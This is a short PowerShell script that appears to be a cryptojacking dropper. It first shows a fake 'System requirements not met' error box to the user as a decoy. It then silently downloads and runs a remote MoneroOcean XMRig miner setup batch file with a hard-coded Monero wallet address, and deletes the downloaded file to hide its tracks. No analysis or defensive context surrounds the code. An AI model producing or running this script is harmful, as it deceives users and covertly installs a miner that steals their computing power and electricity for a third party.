Add-Type -AssemblyName PresentationCore,PresentationFramework
$ButtonType = [System.Windows.MessageBoxButton]::OK
$MessageIcon = [System.Windows.MessageBoxImage]::Error
$MessageBody = "System requirements not met"
$MessageTitle = "CONFIGURATION ERROR"

$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)


$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/err4tik0/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 44WW1etki7VDSXozBJkJft5rPNVvPQhSe4rSXM7DqRdT854qzdL2DnD6NieK4mxinyCy3Fuij8jjXZXzHmd66uGaVdzqewk; Remove-Item -Force $tempfile

exit
